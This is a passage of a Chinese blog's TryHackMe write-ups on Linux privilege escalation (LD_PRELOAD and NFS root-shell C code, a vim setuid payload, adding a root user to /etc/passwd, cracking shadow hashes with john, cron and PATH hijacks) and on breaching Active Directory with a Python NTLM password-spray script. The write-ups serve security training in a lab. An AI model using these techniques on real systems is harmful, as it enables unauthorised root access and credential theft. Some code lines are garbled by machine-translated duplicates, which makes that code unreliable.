如上图，浏览一遍发现之后两个用户含有密码，且这两个用户不是root权限，这意味着我们只能使用上述的第一种思路了 手动添加root用户 先通过openssl passwd创建加盐hash密码： openssl passwd -1 -salt hybcx password 添加用户后（请注意如何使用 root:/bin/bash 来提供 root shell），我们将需要切换到该用户，并希望拥有 root 权限。 成功拿到root权限 0x08 参考文章 CTF (Basic Pentesting) de TryHackMe Basic Pentesting TryHackMe - 基础渗透测试 挑战","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-Linux权限提升","path":"/2024/02/10/thm-linux-quan-xian-ti-sheng/","content":"0x01 简介 从本质上讲，权限升级通常涉及从权限较低的帐户到权限较高的帐户。从技术上讲，它是利用操作系统或应用程序中的漏洞、设计缺陷或配置监督来未经授权地访问通常限制用户访问的资源。 在执行现实世界的渗透测试时，很少能够获得为您提供直接管理访问权限的立足点（初始访问权限）。权限升级至关重要，因为它可以让您获得系统管理员级别的访问权限，从而允许您执行以下操作： Resetting passwords 重置密码 Bypassing access controls to compromise protected data 绕过访问控制来破坏受保护的数据 Editing software configurations 编辑软件配置 Enabling persistence 启用持久性 Changing the privilege of existing (or new) users 更改现有（或新）用户的权限 Execute any administrative command 执行任何管理命令 0x02 枚举 枚举是您访问任何系统后必须采取的第一步。您可能已经通过利用导致根级访问的严重漏洞来访问系统，或者只是找到了使用低特权帐户发送命令的方法。与 CTF 机器不同，渗透测试活动不会在您获得特定系统或用户权限级别的访问权限后结束。正如您将看到的，枚举在攻击后阶段与攻击前一样重要。 hostname hostname 命令将返回目标计算机的主机名。尽管该值很容易更改或具有相对无意义的字符串（例如 Ubuntu-3487340239），但在某些情况下，它可以提供有关目标系统在企业网络中的角色的信息（例如用于生产 SQL 服务器的 SQL-PROD-01） 。 uname -a 将打印系统信息，为我们提供有关系统使用的内核的更多详细信息。这在搜索任何可能导致权限升级的潜在内核漏洞时非常有用。 /proc/version proc 文件系统 (procfs) 提供有关目标系统进程的信息。您会在许多不同的 Linux 版本中找到 proc，这使其成为您的武器库中必不可少的工具。 查看 /proc/version 可能会为您提供有关内核版本的信息以及其他数据，例如是否安装了编译器（例如 GCC）。 /etc/issue 还可以通过查看 /etc/issue 文件来识别系统。该文件通常包含一些有关操作系统的信息，但可以轻松自定义或更改。在这个主题上，任何包含系统信息的文件都可以定制或更改。为了更清楚地了解系统，最好查看所有这些内容。 ps Command ps 命令是查看 Linux 系统上正在运行的进程的有效方法。在终端上输入 ps 将显示当前 shell 的进程。 ps （进程状态）的输出将显示以下内容； PID：进程ID（进程唯一） TTY：用户使用的终端类型 时间：进程使用的 CPU 时间量（这不是该进程运行的时间） CMD：正在运行的命令或可执行文件（不会显示任何命令行参数） “ps”命令提供了一些有用的选项。 ps -A ：查看所有正在运行的进程 ps axjf ：查看进程树（在下面运行 ps axjf 之前查看树的形成） ps aux ： aux 选项将显示所有用户的进程 (a)、显示启动进程的用户 (u) 以及显示未附加到终端的进程 (x ）。查看ps aux命令的输出，我们可以更好地了解系统和潜在的漏洞。 env env 命令将显示环境变量。 PATH 变量可能具有编译器或脚本语言（例如 Python），可用于在目标系统上运行代码或用于权限升级。 sudo -l 目标系统可以配置为允许用户以 root 权限运行某些（或全部）命令。 sudo -l 命令可用于列出用户可以使用 sudo 运行的所有命令. ls Linux 中常用的命令之一可能是 ls. 在寻找潜在的权限提升向量时，请记住始终使用带有 -la 参数的 ls 命令。下面的示例显示了如何使用 ls 或 ls -l 命令轻松错过“secret.txt”文件。 Id id 命令将提供用户权限级别和组成员身份的总体概述。 值得记住的是， id 命令也可用于获取其他用户的相同信息，如下所示。 /etc/passwd 读取 /etc/passwd 文件可以是发现系统上用户的简单方法。 虽然输出可能很长并且有点令人生畏，但它可以轻松地被剪切并转换为用于暴力攻击的有用列表。 请记住，这将返回所有用户，其中一些是不是很有用的系统或服务用户。另一种方法可能是 grep 查找“home”，因为真正的用户很可能将其文件夹放在“home”目录下。 history 使用 history 命令查看早期命令可以让我们了解目标系统，并且（尽管很少）存储了密码或用户名等信息。 ifconfig 目标系统可能是另一个网络的枢纽点。 ifconfig 命令将为我们提供有关系统网络接口的信息。下面的示例显示目标系统具有三个接口（eth0、tun0 和 tun1）。我们的攻击机器可以到达 eth0 接口，但无法直接访问其他两个网络。 可以使用 ip route 命令查看存在哪些网络路由来确认这一点。 netstat 对现有接口和网络路由进行初步检查后，值得研究现有通信。 netstat 命令可以与多个不同的选项一起使用来收集有关现有连接的信息。 netstat -a ：显示所有监听端口和已建立的连接。 netstat -at 或 netstat -au 也可用于分别列出 TCP 或 UDP 协议。 netstat -l ：列出“监听”模式下的端口。这些端口已打开并准备好接受传入连接。这可以与“t”选项一起使用，以仅列出使用 TCP 协议侦听的端口（如下） netstat -s ：按协议列出网络使用统计信息（如下） 这也可以与 -t 或 -u 选项一起使用，以将输出限制为特定协议。 netstat -tp ：列出连接以及服务名称和PID信息。 这也可以与 -l 选项一起使用来列出侦听端口（如下） 我们可以看到“PID/程序名称”列为空，因为该进程由另一个用户拥有。 下面是使用 root 权限运行的相同命令，并将此信息显示为 2641/nc (netcat) netstat -i ：显示接口统计信息。我们在下面看到“eth0”和“tun0”比“tun1”更活跃。 您可能在博客文章、文章和课程中最常看到的 netstat 用法是 netstat -ano ，可以细分如下； -a ：显示所有套接字 -n ：不解析名称 -o ：显示计时器 find 在目标系统中搜索重要信息和潜在的权限升级向量可能会取得丰硕成果。内置的“查找”命令很有用，值得保留在您的武器库中。 以下是“查找”命令的一些有用示例。 Find files find . -name flag1.txt ：在当前目录中查找名为“flag1.txt”的文件 find /home -name flag1.txt ：在/home目录中查找文件名“flag1.txt” find / -type d -name config ：找到“/”下名为config的目录 find / -type f -perm 0777 ：查找具有777权限的文件（所有用户可读、可写、可执行的文件） find / -perm a=x ：查找可执行文件 find /home -user frank ：查找“/home”下用户“frank”的所有文件 find / -mtime 10 ：查找最近10天内修改过的文件 find / -atime 10 ：查找最近 10 天内访问过的文件 find / -cmin -60 ：查找最近一小时（60 分钟）内更改的文件 find / -amin -60 ：查找最近一小时（60分钟）内的文件访问情况 find / -size 50M ：查找大小为 50 MB 的文件 该命令还可以与（+）和（-）符号一起使用来指定大于或小于给定大小的文件。 上面的示例返回大于 100 MB 的文件。值得注意的是，“find”命令往往会产生错误，有时会导致输出难以阅读。这就是为什么明智的做法是使用带有“-type f 2&gt;/dev/null”的“find”命令将错误重定向到“/dev/null”并获得更清晰的输出（如下）。 可以写入或执行的文件夹和文件： find / -writable -type d 2&gt;/dev/null ：查找全局可写文件夹 find / -perm -222 -type d 2&gt;/dev/null ：查找全局可写文件夹 find / -perm -o w -type d 2&gt;/dev/null ：查找全局可写文件夹 我们看到三个不同的“查找”命令可能导致相同结果的原因可以在手册文档中看到。如下所示，perm 参数会影响“查找”的工作方式。 find / -perm -o x -type d 2&gt;/dev/null ：查找全局可执行文件夹 查找开发工具和支持的语言： find / -name perl* find / -name python* find / -name gcc* 查找特定文件权限： 下面是一个简短的示例，用于查找设置了 SUID 位的文件。 SUID 位允许文件以拥有该文件的帐户（而不是运行该文件的帐户）的权限级别运行。这允许一个有趣的权限升级路径，我们将在任务 6 中看到更多细节。下面的示例用于完成“find”命令的主题。 find / -perm -u=s -type f 2&gt;/dev/null ：查找带有SUID位的文件，这允许我们以比当前用户更高的权限级别运行该文件。 通用 Linux 命令 由于我们处于 Linux 领域，熟悉 Linux 命令通常会非常有用。请花一些时间熟悉 find 、 locate 、 grep 、 cut 、 sort 等命令， ETC。 0x03 自动枚举工具 有几种工具可以帮助您在枚举过程中节省时间。这些工具只能用于节省时间，因为它们可能会错过一些权限升级向量。下面是流行的 Linux 枚举工具的列表，以及各自的 Github 存储库的链接。 目标系统的环境将影响您将能够使用的工具。例如，如果目标系统上未安装用 Python 编写的工具，您将无法运行该工具。这就是为什么熟悉几个工具比拥有一个首选工具更好。 LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS LinEnum: https://github.com/rebootuser/LinEnum LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration Linux Priv Checker: https://github.com/linted/linuxprivchecker 0x04 提权：内核漏洞 理想情况下，权限升级会导致 root 权限。有时可以简单地通过利用现有漏洞来实现，或者在某些情况下通过访问具有更多权限、信息或访问权限的另一个用户帐户来实现。 除非单个漏洞导致 root shell，否则权限提升过程将依赖于错误配置和宽松的权限。 Linux 系统上的内核管理系统内存和应用程序等组件之间的通信。这个关键功能需要内核有特定的权限；因此，成功利用该漏洞可能会导致 root 权限。 内核利用方法很简单； 识别内核版本 搜索并找到目标系统内核版本的漏洞利用代码 运行漏洞利用程序 虽然看起来很简单，但请记住，失败的内核漏洞可能会导致系统崩溃。在尝试内核漏洞之前，请确保这种潜在结果在渗透测试范围内是可以接受的。 **Research sources: ** 根据您的发现，您可以使用 Google 搜索现有的漏洞利用代码。 https://www.linuxkernelcves.com/cves 等来源也很有用。 另一种选择是使用 LES（Linux Exploit Suggester）之类的脚本，但请记住，这些工具可能会生成误报（报告不影响目标系统的内核漏洞）或漏报（不报告任何内核漏洞，尽管内核是易受伤害的）。 **Hints/Notes: ** 在 Google、Exploit-db 或 searchsploit 上搜索漏洞时对内核版本过于具体 在启动漏洞利用代码之前，请确保您了解其工作原理。某些漏洞利用代码可以对操作系统进行更改，从而使它们在进一步使用时不安全，或者对系统进行不可逆转的更改，从而在以后产生问题。当然，这些在实验室或 CTF 环境中可能不是大问题，但在真正的渗透测试过程中这些绝对是禁忌。 有些漏洞一旦运行可能需要进一步的交互。阅读漏洞利用代码提供的所有注释和说明。 您可以分别使用 SimpleHTTPServer Python 模块和 wget 将漏洞利用代码从您的计算机传输到目标系统。 这里由于当时忘记保存了，也懒得再搞一次，就借用照片过一下 首先上述暴露了linux内核版本，直接Google搜索看有没有相关漏洞，幸运的是存在 直接下载到攻击机，接着python开启http服务，上传恶意文件到靶机上，接着在靶机上 gcc 37292.c -o priv 不过下载的时候就会发现当前目录会不存在某种权限（没细看忘了），接着我们就可以转到tmp目录下，因为这条目录毫无限制 下载成功后直接./priv执行恶意文件即可，最终会发现获取root权限 0x05 提权：Sudo 默认情况下，sudo 命令允许您以 root 权限运行程序。在某些情况下，系统管理员可能需要为普通用户提供一定的权限灵活性。例如，初级 SOC 分析师可能需要定期使用 Nmap，但不会获得完全 root 访问权限。在这种情况下，系统管理员可以允许该用户仅以 root 权限运行 Nmap，同时在系统的其余部分保持其常规权限级别。 任何用户都可以使用 sudo -l 命令检查其与root权限相关的当前情况。 https://gtfobins.github.io/ 是一个有价值的资源，它提供了有关如何使用您可能拥有 sudo 权限的任何程序的信息。 利用应用程序功能 某些应用程序在此上下文中不会有已知的漏洞。您可能会看到的这样的应用程序是 Apache2 服务器。 在这种情况下，我们可以使用“黑客”来利用应用程序的功能来泄露信息。如下所示，Apache2 有一个选项支持加载备用配置文件（ -f ：指定备用 ServerConfigFile）。 使用此选项加载 /etc/shadow 文件将导致一条错误消息，其中包含 /etc/shadow 文件的第一行。 Leverage LD_PRELOAD 在某些系统上，您可能会看到 LD_PRELOAD 环境选项。 LD_PRELOAD 是一个允许任何程序使用共享库的函数。这篇博文将让您了解 LD_PRELOAD 的功能。如果启用“env_keep”选项，我们可以生成一个共享库，该库将在程序运行之前加载并执行。请注意，如果真实用户 ID 与有效用户 ID 不同，LD_PRELOAD 选项将被忽略。 这个特权升级向量的步骤可以总结如下： 检查 LD_PRELOAD（使用 env_keep 选项） 编写一个简单的 C 代码编译为共享对象（.so 扩展名）文件 使用 sudo 权限和指向我们的 .so 文件的 LD_PRELOAD 选项运行程序 C 代码将简单地生成一个 root shell，可以编写如下； #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdlib.h&gt; void _init() { 无效_init() { unsetenv(\"LD_PRELOAD\"); 取消设置环境（“LD_PRELOAD”）； setgid(0); 设置gid(0); setuid(0); system(\"/bin/bash\"); 系统（“/bin/bash”）； } 我们可以将此代码保存为 shell.c，并使用 gcc 使用以下参数将其编译为共享对象文件； gcc -fPIC -shared -o shell.so shell.c -nostartfiles 现在，当启动用户可以使用 sudo 运行的任何程序时，我们可以使用此共享对象文件。在我们的例子中，Apache2、find 或几乎任何我们可以使用 sudo 运行的程序都可以使用。 我们需要通过指定LD_PRELOAD选项来运行程序，如下； sudo LD_PRELOAD=/home/user/ldpreload/shell.so find 这将导致生成具有 root 权限的 shell。 但这一关与上述步骤无关，如下图可以看到没有LD_PRELOAD选项 因此这一关采用其他提权，如上图，可以看到sudo可以使用的命令有三种，那我们利用这三种命令均可以提权 https://gtfobins.github.io/ 访问之后搜索find或less或nano命令 找到对应的sudo命令，直接输入之后，即可达到root权限 0x06 提权：Suid 许多 Linux 权限控制依赖于控制用户和文件交互。这是通过权限完成的。到现在为止，您知道文件可以具有读、写和执行权限。这些是在其权限级别内提供给用户的。这会随着 SUID（集用户标识）和 SGID（集组标识）而改变。这些允许分别以文件所有者或组所有者的权限级别执行文件。 您会注意到这些文件有一个“s”位设置，显示其特殊权限级别。 find / -type f -perm -04000 -ls 2&gt;/dev/null 将列出设置了 SUID 或 SGID 位的文件。 下面是一个简单示例： 一个好的做法是将此列表中的可执行文件与 GTFOBins (https://gtfobins.github.io) 进行比较。单击 SUID 按钮将过滤设置 SUID 位时已知可利用的二进制文件（您也可以使用此链接获取预过滤列表 https://gtfobins.github.io/#+suid）。 上面的列表显示 Nano 已设置 SUID 位。不幸的是，GTFObins 并没有让我们轻松获胜。对于现实生活中的特权升级场景来说，我们需要找到中间步骤来帮助我们利用我们所拥有的任何微小的发现。 注意：附加的虚拟机有另一个具有 SUID 的二进制文件，而不是 nano 。 Nano 文本编辑器的 SUID 位设置允许我们使用文件所有者的权限创建、编辑和读取文件。 Nano 由 root 拥有，这可能意味着我们可以以比当前用户更高的权限级别读取和编辑文件。在此阶段，我们有两个基本的权限升级选项：读取 /etc/shadow 文件或将我们的用户添加到 /etc/passwd 。 以下是使用这两个向量的简单步骤。 读取 /etc/shadow 文件 我们看到 Nano 文本编辑器通过运行 find / -type f -perm -04000 -ls 2&gt;/dev/null 命令设置了 SUID 位。 nano /etc/shadow 将打印 /etc/shadow 文件的内容。我们现在可以使用 unshadow 工具创建一个可由 John the Ripper 破解的文件。要实现此目的，unshadow 需要 /etc/shadow 和 /etc/passwd 文件。 unshadow工具的用法如下所示：unshadow passwd.txt shadow.txt &gt; passwords.txt 有了正确的单词列表和一点运气，开膛手约翰就可以以明文形式返回一个或多个密码。有关开膛手约翰的更详细房间，您可以访问 https://tryhackme.com/room/johntheripper0 另一种选择是添加具有 root 权限的新用户。这将帮助我们绕过密码破解的繁琐过程。下面是一个简单的方法： 我们需要我们希望新用户拥有的密码的哈希值。这可以使用 Kali Linux 上的 openssl 工具快速完成。 然后，我们将此密码和用户名添加到 /etc/passwd 文件中。 添加用户后（请注意如何使用 root:/bin/bash 来提供 root shell），我们将需要切换到该用户，并希望拥有 root 权限。 现在轮到您使用刚刚学到的技能来查找易受攻击的二进制文件。 接下来我们连接靶机，之后cat /etc/passwd查看用户 随后题目让我们获取user2的密码，这里就用到上面的方法，接下来就是读取相关文件了 base64 /etc/passwd | base64 --decode base64 /etc/shadow | base64 --decode 显然，两者对比就知道我们应该重点关注哪几个用户了（也就是最后三个用户），我们将其分别复制到相关文件中 如上图创建好相关文件之后 unshadow passwd.txt shadow.txt &gt; passwords.txt john /usr/share/wordlists/passwords/rockyou.txt passwords.txt 利用john进行密码的破解 成功得到user2的密码 最后的flag可以通过root权限读取，也可以利用base64命令读取 0x07 提权：Capabilities（能力） 系统管理员可以用来提高进程或二进制文件的权限级别的另一种方法是“功能”。功能有助于更精细地管理权限。例如，如果 SOC 分析师需要使用需要启动套接字连接的工具，普通用户将无法做到这一点。如果系统管理员不想授予该用户更高的权限，他们可以更改二进制文件的功能。因此，二进制文件无需更高权限的用户即可完成其任务。 功能手册页提供了有关其用法和选项的详细信息，我们可以使用 getcap 工具列出启用的功能。 当以非特权用户身份运行时， getcap -r / 将生成大量错误，因此最好将错误消息重定向到 /dev/null。 请注意，vim 及其副本都没有设置 SUID 位。因此，在枚举文件以查找 SUID 时，无法发现此权限升级向量。 GTFObins 有一个很好的二进制文件列表，如果我们发现任何设置的功能，可以利用这些二进制文件进行权限升级。 我们注意到 vim 可以与以下命令和负载一起使用： 似乎是只有设置为setcap cap_setuid+ep vim才可以 ./vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")' 0x08 提权：Cron任务 Cron 任务用于在特定时间运行脚本或二进制文件。默认情况下，它们以其所有者的权限运行，而不是以当前用户的权限运行。虽然正确配置的 cron 作业本身并不容易受到攻击，但它们在某些情况下可以提供权限升级向量。 这个想法很简单；如果有一个以 root 权限运行的计划任务，并且我们可以更改将运行的脚本，那么我们的脚本将以 root 权限运行。 Cron 作业配置存储为 crontab（cron 表），以查看任务下次运行的时间和日期。 系统上的每个用户都有自己的 crontab 文件，并且无论是否登录都可以运行特定任务。正如您所期望的，我们的目标是找到由 root 设置的 cron 作业并让它运行我们的脚本（最好是 shell）。 任何用户都可以读取 /etc/crontab 下保存系统范围 cron 作业的文件 虽然 CTF 机器可以每分钟或每 5 分钟运行一次 cron 作业，但在渗透测试活动中，您会更经常看到每天、每周或每月运行的任务。 这里可以看到下列的sh文件都是每一分钟运行一次，接下来我们可以看看我们能访问哪些文件 测试一番发现只能访问backup.sh文件 由于我们当前的用户可以访问此脚本，因此我们可以轻松修改它以创建一个反向 shell，希望具有 root 权限。 该脚本将使用目标系统上可用的工具来启动反向 shell。 需要注意的两点： 命令语法将根据可用工具的不同而有所不同。 （例如 nc 可能不支持您在其他情况下使用过的 -e 选项） 我们应该始终倾向于启动反向 shell，因为我们不想在真正的渗透测试过程中损害系统的完整性。 该文件应如下所示： 现在，我们将在攻击机器上运行一个监听器来接收传入的连接。这里我一直没反应，结果发现是该sh文件没有x权限。。。 之后靶机开启监听即可 Crontab 始终值得检查，因为它有时会导致轻松的权限升级向量。在不具备一定网络安全成熟度级别的公司中，以下情况并不少见： 系统管理员需要定期运行脚本。 他们创建了一个 cron 作业来执行此操作 一段时间后，脚本变得毫无用处，他们将其删除 他们不清理相关的 cron 作业 此变更管理问题会导致利用 cron 作业的潜在漏洞。 上面的示例显示了类似的情况，antivirus.sh 脚本被删除，但 cron 作业仍然存在。 如果未定义脚本的完整路径（就像为 backup.sh 脚本所做的那样），cron 将引用 /etc/crontab 文件中 PATH 变量下列出的路径。在这种情况下，我们应该能够在用户的主文件夹下创建一个名为“antivirus.sh”的脚本，并且它应该由 cron 作业运行。 目标系统上的文件应该看起来很熟悉： 传入的反向 shell 连接具有 root 权限： 在奇怪的情况下，您发现现有脚本或任务附加到 cron 作业，总是值得花时间来了解脚本的功能以及如何在上下文中使用任何工具。例如，tar、7z、rsync 等，可以利用其通配符功能进行利用。 接下来依照老方法，分别读取passwd与shadow文件，最后爆破密码即可 0x09 提权：PATH 如果您的用户具有写入权限的文件夹位于路径中，您可能会劫持应用程序来运行脚本。 Linux 中的 PATH 是一个环境变量，它告诉操作系统在哪里搜索可执行文件。对于任何未内置到 shell 中或未使用绝对路径定义的命令，Linux 将开始在 PATH 下定义的文件夹中搜索。 （PATH是我们这里讨论的环境变量，path是文件的位置）。 通常，PATH 看起来像这样： 如果我们在命令行中输入“thm”，Linux 将在这些位置查找名为 thm 的可执行文件。下面的场景将使您更好地了解如何利用它来提高我们的特权级别。正如您将看到的，这完全取决于目标系统的现有配置，因此在尝试此操作之前，请确保您可以回答以下问题。 $PATH 下有哪些文件夹 您当前的用户是否具有这些文件夹的写入权限？ 可以修改$PATH吗？ 您可以启动的脚本/应用程序是否会受到此漏洞的影响？ 出于演示目的，我们将使用以下脚本： 该脚本尝试启动一个名为“thm”的系统二进制文件，但该示例可以轻松地用任何二进制文件复制。 我们将其编译为可执行文件并设置 SUID 位。 我们的用户现在可以访问设置了 SUID 位的“path”脚本。 执行后，“path”将在 PATH 下列出的文件夹中查找名为“thm”的可执行文件。 如果 PATH 下列出了任何可写文件夹，我们可以在该目录下创建一个名为 thm 的二进制文件，并让我们的“path”脚本运行它。设置 SUID 位后，该二进制文件将以 root 权限运行 可以使用“ find / -writable 2&gt;/dev/null ”命令完成对可写文件夹的简单搜索。可以使用简单的剪切和排序序列来清理此命令的输出。 某些 CTF 场景可以呈现不同的文件夹，但常规系统会输出类似于我们上面看到的内容。 将其与 PATH 进行比较将帮助我们找到可以使用的文件夹。 我们在 /usr 下看到许多文件夹，因此再次运行可写文件夹搜索以覆盖子文件夹可能会更容易。 另一种选择是使用下面的命令。 find / -writable 2&gt;/dev/null | cut -d \"/\" -f 2,3 | grep -v proc | sort -u 我们添加了“grep -v proc”来消除与运行进程相关的许多结果。 不幸的是，/usr下的子文件夹不可写 更容易写入的文件夹可能是 /tmp。此时，由于 PATH 中不存在 /tmp，因此我们需要添加它。如下所示，“ export PATH=/tmp:$PATH ”命令完成了这一任务。 此时，路径脚本还将在 /tmp 文件夹下查找名为“thm”的可执行文件。 通过将 /bin/bash 作为“thm”复制到 /tmp 文件夹下，创建此命令相当容易。 我们已经为 /bin/bash 的副本授予了可执行权限，请注意，此时它将以我们的用户权限运行。在此上下文中，使权限升级成为可能的原因是路径脚本以 root 权限运行。 find / -writable 2&gt;/dev/null | cut -d \"/\" -f 2,3 | grep -v proc | sort -u 使用上述命令发现了众多可执行文件夹，其中可疑的为：home/murdoch 可以看到其中包含test和thm.py文件 当我们尝试运行的时候，会发现找不到命令thm，那我们可以自己构造thm可执行文件 接着将该目录添加进PATH中，执行test即可 0x10 提权：NFS 权限升级向量不仅限于内部访问。共享文件夹和远程管理界面（例如 SSH 和 Telnet）还可以帮助您获得目标系统的 root 访问权限。有些情况还需要使用两个向量，例如在目标系统上查找 root SSH 私钥，并通过 SSH 以 root 权限进行连接，而不是尝试提高当前用户的权限级别。 与 CTF 和考试更相关的另一个向量是配置错误的网络 shell。当存在网络备份系统时，有时可以在渗透测试期间看到此向量。 NFS（网络文件共享）配置保存在 /etc/exports 文件中。该文件是在 NFS 服务器安装期间创建的，通常可供用户读取。 此权限升级向量的关键元素是您在上面看到的“no_root_squash”选项。默认情况下，NFS 会将 root 用户更改为 nfsnobody，并禁止以 root 权限操作任何文件。如果可写共享上存在“no_root_squash”选项，我们可以创建一个设置了 SUID 位的可执行文件并在目标系统上运行它。 我们将首先枚举攻击机器上的可安装共享。 我们将把“no_root_squash”共享之一安装到我们的攻击机器上并开始构建我们的可执行文件。 mount -o rw 10.10.104.35:/home/ubuntu/sharedfolder /tmp/sharedfolder 由于我们可以设置 SUID 位，因此在目标系统上运行 /bin/bash 的简单可执行文件将完成这项工作。 #include&lt;stdlib.h&gt; #include&lt;stdio.h&gt; #include&lt;unistd.h&gt; int main(){ setgid(0); setuid(0); system(\"/bin/bash\"); return 0; } 编译代码后，我们将设置 SUID 位。 您将在下面看到这两个文件（nfs.c 和 nfs 都存在于目标系统上。我们已经处理了已安装的共享，因此无需传输它们）。 我们在靶机上也可以看到这是可以执行的，但执行之后却爆出gcc编译错误 这个问题似乎无法得到解决，这是因为我的kali机与靶机glibc版本不匹配导致的，这里就只能清楚思路了 但我们运行nfs需要2.34，而且当前用户不是root无法升级glibc 0x11 挑战 到目前为止，您已经对 Linux 上的主要权限升级向量有了相当好的了解，并且这个挑战应该相当容易。 您已获得对大型科学设施的 SSH 访问权限。尝试提升您的权限，直到成为 Root 为止。 我们设计这个房间是为了帮助您构建一个全面的 Linux 权限升级方法，这在 OSCP 和渗透测试等考试中非常有用。 不要不探索任何特权升级向量，特权升级通常更像是一门艺术，而不是一门科学。 您可以通过浏览器访问目标计算机或使用下面的 SSH 凭据。 Username: leonard Password: Penny123 链接之后就是信息搜集一下，发现不存在nfs、内核漏洞的利用可能。接着看了一下sudo命令 发现有find可以利用，直接上命令即可 之后就是找寻flag的旅程","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-入侵AD","path":"/2024/02/09/thm-ru-qin-ad/","content":"0x01 简介 大约 90% 的全球财富 1000 强公司使用 Active Directory (AD)。如果一个组织的资产使用 Microsoft Windows，那么您几乎肯定会找到 AD。 Microsoft AD 是用于管理 Windows 域网络的主导套件。然而，由于AD用于整个产业的身份和访问管理，它掌握着王国的钥匙，使其很可能成为攻击者的目标。 Breaching Active Directory 在我们利用 AD 错误配置进行权限提升、横向移动和目标执行之前，您首先需要初始访问权限。您需要获取一组初始的有效 AD 凭据。由于 AD 服务和功能的数量众多，获取一组初始 AD 凭据的攻击面通常很大。在这个房间里，我们将讨论几种途径，但这绝不是详尽的列表。 在查找第一组凭据时，我们不会关注与帐户关联的权限；而是关注与帐户相关的权限。因此，即使是低权限帐户也足够了。我们只是在寻找一种对 AD 进行身份验证的方法，使我们能够对 AD 本身进行进一步的枚举。 Learning Objectives 在这个网络中，我们将介绍几种可用于入侵 AD 的方法。这绝不是完整的列表，因为每天都会发现新的方法和技术。但是，我们将介绍以下技术来恢复此网络中的 AD 凭据： NTLM 认证服务 LDAP 绑定凭证 Authentication Relays 认证中继 微软部署工具包 Configuration Files 配置文件 我们可以通过针对面向互联网的组织的系统或通过在组织的网络上植入恶意设备来使用这些技术进行安全评估。 0x02 OSINT 和网络钓鱼 获取第一组 AD 凭据的两种流行方法是开源情报 (OSINT) 和网络钓鱼。我们在这里仅简单提及这两种方法，因为它们已经在其他房间中进行了更深入的介绍。 OSINT 开源情报 OSINT 用于发现已公开披露的信息。就 AD 凭据而言，发生这种情况的原因有多种，例如： 在 Stack Overflow 等公共论坛上提问但在问题中披露敏感信息（例如凭据）的用户。 使用硬编码凭据将脚本上传到 Github 等服务的开发人员。 由于员工使用其工作帐户注册其他外部网站，因此在过去的违规行为中，凭证被泄露。 HaveIBeenPwned 和 DeHashed 等网站提供了出色的平台，可以确定某人的信息（例如工作电子邮件）是否曾经涉及公开的数据泄露事件。 通过使用 OSINT 技术，有可能恢复公开披露的凭据。如果我们足够幸运找到凭证，我们仍然需要找到一种方法来测试它们是否有效，因为 OSINT 信息可能会过时。在任务 3 中，我们将讨论 NTLM 身份验证服务，它可能提供一个极好的途径来测试凭据以查看它们是否仍然有效。 A detailed room on Red Team OSINT can be found here. 可以在此处找到有关红队 OSINT 的详细房间。 Phishing 网络钓鱼是另一种破坏 AD 的绝佳方法。网络钓鱼通常会诱使用户在恶意网页上提供凭据，或要求他们运行特定的应用程序，该应用程序会在后台安装远程访问特洛伊木马 (RAT)。这是一种流行的方法，因为 RAT 会在用户的上下文中执行，从而立即允许您模拟该用户的 AD 帐户。这就是为什么网络钓鱼对于红队和蓝队来说都是一个大话题。 A detailed room on phishing can be found here. 可以在此处找到有关网络钓鱼的详细信息。 0x03 NTLM 验证服务 NTLM and NetNTLM 新技术 LAN 管理器 (NTLM) 是一套用于在 AD 中验证用户身份的安全协议。 NTLM 可用于通过使用称为 NetNTLM 的基于质询-响应的方案进行身份验证。这种身份验证机制被网络上的服务大量使用。但是，使用 NetNTLM 的服务也可以暴露在互联网上。以下是一些流行的例子： 公开 Outlook Web App (OWA) 登录门户的内部托管 Exchange（邮件）服务器。 暴露于互联网的服务器的远程桌面协议（RDP）服务。 与 AD 集成的公开 VPN 端点。 面向互联网并使用 NetNTLM 的 Web 应用程序。 NetNTLM，通常也称为 Windows 身份验证或 NTLM 身份验证，允许应用程序扮演客户端和 AD 之间的中间人的角色。所有身份验证材料都以质询的形式转发到域控制器，如果成功完成，应用程序将对用户进行身份验证。 这意味着应用程序代表用户进行身份验证，而不是直接在应用程序本身上对用户进行身份验证。这可以防止应用程序存储 AD 凭据，该凭据应仅存储在域控制器上。这个过程如下图所示： 暴力登录攻击 如任务 2 中所述，这些公开的服务提供了一个极好的位置来测试使用其他方式发现的凭据。但是，也可以直接使用这些服务来尝试恢复一组初始的有效 AD 凭据。如果我们在最初的红队侦察期间恢复了有效电子邮件地址等信息，我们也许可以尝试使用它们进行暴力攻击。 由于大多数 AD 环境都配置了帐户锁定，因此我们无法运行完整的暴力攻击。相反，我们需要执行密码喷射攻击。我们不会尝试多个不同的密码，这可能会触发帐户锁定机制，而是选择并使用一个密码并尝试使用我们获得的所有用户名进行身份验证。但是，应该注意的是，由于这些类型的攻击将生成大量失败的身份验证尝试，因此可以检测到这些类型的攻击。 您已获得在红队 OSINT 练习中发现的用户名列表。 OSINT 活动还显示了该组织的初始入职密码，似乎是“Changeme123”。尽管用户应始终更改其初始密码，但我们知道用户经常忘记。我们将使用定制开发的脚本对托管在以下 URL 的 Web 应用程序进行密码喷射：http://ntlmauth.za.tryhackme.com。 导航到 URL，我们可以看到它提示我们输入 Windows 身份验证凭据： 注意：Firefox 的 Windows 身份验证插件非常容易失败。如果您想手动测试凭据，建议使用 Chrome。 我们可以使用 Hydra 等工具来协助密码喷射攻击。然而，通常最好自己编写这些类型的攻击脚本，这样您就可以更好地控制该过程。任务文件中提供了一个基本的Python脚本，可用于密码喷射攻击。以下函数是脚本的主要组成部分： def password_spray(self, password, url): print (\"[*] Starting passwords spray attack using the following password: \" + password) #Reset valid credential counter count = 0 #Iterate through all of the possible usernames for user in self.users: #Make a request to the website and attempt Windows Authentication response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + \"\\\\\" + user, password)) #Read status code of response to determine if authentication was successful if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE): print (\"[+] Valid credential pair found! Username: \" + user + \" Password: \" + password) count += 1 continue if (self.verbose): if (response.status_code == self.HTTP_AUTH_FAILED_CODE): print (\"[-] Failed login with Username: \" + user) print (\"[*] Password spray attack completed, \" + str(count) + \" valid credential pairs found\") 